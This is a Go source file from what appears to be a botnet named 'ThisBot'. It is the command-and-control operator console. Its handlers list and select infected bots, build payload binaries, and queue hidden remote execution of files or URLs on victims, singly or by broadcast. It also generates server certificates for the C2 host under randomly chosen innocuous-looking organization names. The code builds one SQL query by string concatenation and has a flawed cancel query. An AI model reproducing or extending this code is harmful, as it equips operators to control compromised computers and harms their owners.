package core

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"crypto/x509"
	"database/sql"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func log_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: log [list/del/export], please enter help command")
		return
	}

	switch ary[1] {
	case "list", "l":
		list_logs()
	case "del", "d":
		del_log(ary)
	case "export", "r":
		export_logs(ary)
	}
}

func task_handler(ary []string) {
	// task [list/export]
	if len(ary) < 2 {
		fmt.Println("[💀] task [list/export], please enter help command")
		return
	}

	switch ary[1] {
	case "list", "l":
		list_tasks(ary)
	case "export", "r":
		export_tasks(ary)
	}
}

func list_handler() {
	sqlStr := "select id from clients"
	var bot common.Client
	var id int64
	rows, err := db1.QueryRows(common.Db, sqlStr)
	if err != nil {
		log.Println(err.Error())
		return
	}
	defer rows.Close()

	if !rows.Next() {
		fmt.Println("💀 💀 💀  No Bot exists")
		return
	}

	common.Mutex.Lock()
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	fmt.Println("⚔️ ⚔️ ⚔️  Currrent bot: ")
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	common.Mutex.Unlock()

	for {
		if rows.Scan(&id) != nil {
			fmt.Println("[💀] Error in showing botid = " + strconv.FormatInt(id, 10))
			continue
		}
		if !get_bot_info(id, &bot) {
			fmt.Println("[💀] Bot " + strconv.FormatInt(id, 10) + " doesn't exist, please enter right bot id")
			continue
		}
		show_bot_info(&bot)
		fmt.Println("")

		if !rows.Next() {
			break
		}
	}
}

func clear_handler() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func build_handler() {
	payload, path := BuildPayload()
	if nil == payload {
		fmt.Println("[💀] Failed to build payload")
		return
	}
	if utils.WriteBinary(path, payload) {
		fmt.Println("[✅] Successfully built payload, path: " + path)
	} else {
		fmt.Println("[💀] Failed to build payload")
	}
}

func cancel_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: cancel [task_id/all], please enter help command")
		return
	}
	option := strings.TrimSpace(strings.ToLower(ary[1]))

	if option == "all" {
		sqlStr := "update tasks t join logs l on l.task_id = t.id set t.status='canceled' " +
			"where l.account_id=? and (instr(t.status, 'queued') or instr(t.status, 'running'))"
		rows, err := db1.Exec(common.Db, sqlStr, common.Account)
		if err != nil {
			fmt.Println("[💀] Failed to cancel all tasks")
		} else if rows == 0 {
			fmt.Println("[💀] No task needs to be canceled")
		} else {
			// Update all status in logs
			sqlStr = "update logs set status='canceled' where account_id=? and (instr(status, 'queued') or instr(status, 'running'))"
			_, err := db1.Exec(common.Db, sqlStr, common.Account)
			if err != nil {
				fmt.Println("[✅] Cancel all tasks successfully but failed to update task logs")
				return
			}
			fmt.Println("[✅] Cancel all tasks successfully")
		}
	} else {
		sqlStr := "update tasks t join logs l on l.task_id=t.id set t.status='canceled' " +
			"where l.account_id=? and l.task_id=? and (instr(t.status, 'queued') or instr(t.status, 'running'))"
		task_id, _ := strconv.ParseInt(option, 10, 64)
		rows, err := db1.Exec(common.Db, sqlStr, common.Account, task_id)
		if err != nil {
			fmt.Printf("[💀] Failed to cancel task[%d]\n", task_id)
		} else if rows == 0 {
			fmt.Printf("[💀] Task[%d] already done\n", task_id)
		} else {
			// Update logs table
			sqlStr = "update logs set status='canceled' where account_id=? and task_id=? or (instr(status, 'queued') or instr(status, 'running'))"
			_, err := db1.Exec(common.Db, sqlStr, common.Account, task_id)
			if err != nil {
				fmt.Printf("[✅] Cancel task[%d] successfully but failed to update task log\n", task_id)
				return
			}
			fmt.Printf("[✅] Cancel task[%d] successfully\n", task_id)
		}
	}
}

func cert_handler(ary []string) {
	if len(ary) > 1 {
		if ary[1] == "list" {
			certPem, err := os.ReadFile(common.DefaultServerCertPath)
			if err != nil {
				fmt.Println("[💀] Failed to read server certificate")
				return
			}
			block, _ := pem.Decode(certPem)
			cert, _ := x509.ParseCertificate(block.Bytes)
			fmt.Println("[🕐] Certificate valid duration: " + cert.NotBefore.String() + " to " + cert.NotAfter.String())
			if time.Now().UTC().After(cert.NotAfter) {
				fmt.Println("[❌] Certificate expired")
			} else if time.Until(cert.NotAfter) < 7*24*time.Hour {
				fmt.Println("[❗] Certificate will expire soon(within 7 days)")
			} else {
				fmt.Println("[✅] Certificate valid")
			}
			return
		}
	}

	for {
		// Enter a CA organization name
		fmt.Print("[⛏️] Input a server certificate authority organization name(Press \"Enter\" to generate a random one): \nBuilder> ")
		organization := strings.TrimSpace(utils.ReadFromIO())
		if len(organization) == 0 {
			// Generate a random fake CA name
			FakeCAName := []string{
				"Global Network Services", "Unified Infrastructure Group", "Enterprise Connectivity Services",
				"Core Systems Integration", "Distributed Services Group", "Applied Network Solutions", "Infrastructure Reliability Services",
			}
			organization = FakeCAName[common.Seed.Intn(len(FakeCAName))]
			fmt.Println("[✅] Organization: " + organization)
		}
		// Enter the CA root certificate valid duration
		fmt.Print("[⛏️] Please enter the valid duration of the server certificate, in the format: \"YYYY-MM-dd\"(Default is 1000-00-00)\nBuilder> ")
		duration := strings.TrimSpace(utils.ReadFromIO())
		if len(duration) == 0 {
			duration = "1000-00-00"
		}
		fmt.Println("[✅] Valid duration: " + duration)

		fmt.Print("[⛏️] Do you have domains, if not, press 'Enter' directly, or enter them split by space(example: 'xxxx.com xxxxx.org localhost')\nBuilder> ")
		var domains []string = nil
		var domains_full []string = nil
		var ips []net.IP = nil
		var ip string
		strDomains := strings.TrimSpace(utils.ReadFromIO())
		if len(strDomains) == 0 {
			ips = make([]net.IP, 0)
			fmt.Print("[⛏️] What's your VPS IP which installed your C2?\nBuilder> ")
			ip = strings.TrimSpace(utils.ReadFromIO())
			for {
				if !utils.IsLegalURLOrIP(ip) {
					fmt.Println("[💀] Illegal IP, please enter a valid IP address")
				} else {
					ips = append(ips, net.ParseIP(ip))
					fmt.Println("[✅] Current certificate IP: " + ip)
					break
				}
			}
		} else {
			domains = make([]string, 0)
			domains_full = strings.Split(strDomains, " ")
			for _, domain := range domains_full {
				if !utils.IsLegalURLOrIP(domain) {
					fmt.Println("[💀] Domain \"" + domain + "\" is illegal")
				} else {
					domains = append(domains, domain)
				}
			}
		}
		// Try to generate CA certificate
		if common.ResignCertificate(organization, duration, domains, ips) {
			return
		}
		fmt.Println("[⛏️] Do you want to try again?(y/n, default is y)\nBuilder> )")
		cmd := strings.ToLower(utils.ReadFromIO())
		if cmd == "n" || cmd == "no" {
			break
		}
	}
	fmt.Println("[⛏️] Failed to generate server certificate")
}

func select_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: select botid, please enter help command")
		return
	}
	// Check it's a number
	botid, err := strconv.ParseInt(ary[1], 10, 64)
	if err != nil || botid == 0 {
		fmt.Println("[💀] You need to enter a bot id which is number")
		return
	}
	// Check if bot in database record
	var bot common.Client
	if !get_bot_info(botid, &bot) {
		fmt.Println("[💀] Bot doesn't exist, please enter right bot id")
		return
	}
	// Switch mode
	common.CurrentBot = botid
	show_bot_info(&bot)
}

func uninstall_handler() {
	sqlStr := "select id from commands where name='uninstall'"
	command_id := 0
	if err := db1.QueryRow(common.Db, sqlStr).Scan(&command_id); err != nil {
		if err == sql.ErrNoRows {
			fmt.Println("[💀] No such command")
		} else {
			fmt.Println("[💀] Command error")
		}
		return
	}
	map_args := map[string]interface{}{}
	byt, _ := json.Marshal(map_args)
	sqlStr = "insert into tasks(bot_id, command_id, status, args) values (?,?,?,?)"
	if common.CurrentBot == 0 {
		fmt.Println("[❗] It's broadcast mode now, can't use 'uninstall' command")
		return
	}
	_, err := db1.Insert(common.Db, sqlStr, common.CurrentBot, command_id, "queued", byt)
	if err != nil {
		fmt.Println("[💀] Failed to generate uninstall command")
	} else {
		fmt.Println("[✅] Generate uninstall command successfully")
	}
}

func exec_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: exec [-h] path/url [args], please enter help command")
		return
	}
	var options string = ""
	var hidden bool = false

	if ary[1] == "-h" {
		hidden = true
	}

	i := 1
	if hidden {
		i++
	}

	for ; i < len(ary); i++ {
		options += " " + ary[i]
	}
	options = strings.TrimSpace(options)
	// Complete the command
	if strings.ToLower(ary[0]) == "exec" {
		ary[0] = "execute"
	}
	// Query if there's command in database
	sqlStr := "select id from commands where name='" + ary[0] + "'"

	command_id := 0
	err := db1.QueryRow(common.Db, sqlStr).Scan(&command_id)
	if err != nil {
		if err == sql.ErrNoRows {
			fmt.Println("[💀] No such command")
		} else {
			fmt.Println("[💀] Command error")
		}
		return
	}

	sqlStr = "insert into tasks (bot_id, command_id, args, status) values (?,?,?,?)"
	map_args := map[string]interface{}{
		"args":   options,
		"hidden": hidden,
	}
	byt, _ := json.Marshal(map_args)
	_, err = db1.Insert(common.Db, sqlStr, common.CurrentBot, command_id, byt, "queued")
	if err != nil {
		fmt.Println("[💀] Failed to generate command")
		return
	} else {
		fmt.Println("[✅] Generate command okay")
	}
}

func mode_handler(ary []string) {
	if len(ary) == 1 {
		if common.CurrentBot == 0 {
			fmt.Println("[✅] Broadcast mode")
		} else {
			fmt.Println("[✅] Current bot ID: " + strconv.FormatInt(common.CurrentBot, 10))
		}
	} else {
		if ary[1] == "broadcast" {
			common.CurrentBot = 0
			fmt.Println("[✅] Switch to broadmode")
		} else {
			fmt.Println("[💀] Failed to switch to broadcast mode")
		}
	}
}

func info_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: info id, request latest bot information")
		return
	}
	botid, err := strconv.ParseInt(ary[1], 10, 64)
	if err != nil {
		fmt.Println("[💀] You need to enter a bot id which is number")
		return
	}
	var bot common.Client
	if !get_bot_info(botid, &bot) {
		fmt.Println("[💀] Bot doesn't exist, please enter right bot id")
		return
	}
	show_bot_info(&bot)
}
